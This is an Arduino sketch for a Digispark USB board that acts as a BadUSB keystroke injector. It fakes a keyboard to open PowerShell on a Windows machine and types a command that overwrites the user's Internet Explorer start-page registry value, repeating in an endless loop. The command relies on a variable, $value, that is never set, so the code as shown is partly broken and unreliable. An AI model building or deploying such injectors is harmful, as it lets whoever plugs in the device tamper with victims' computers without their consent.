#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(0xe3, 0x08);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("$path = \'HKCU:\\Software\\Microsoft\\Internet Explorer\\Main\\\';$name = \'start page\';Set-Itemproperty -Path $path -Name $name -Value $value");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}
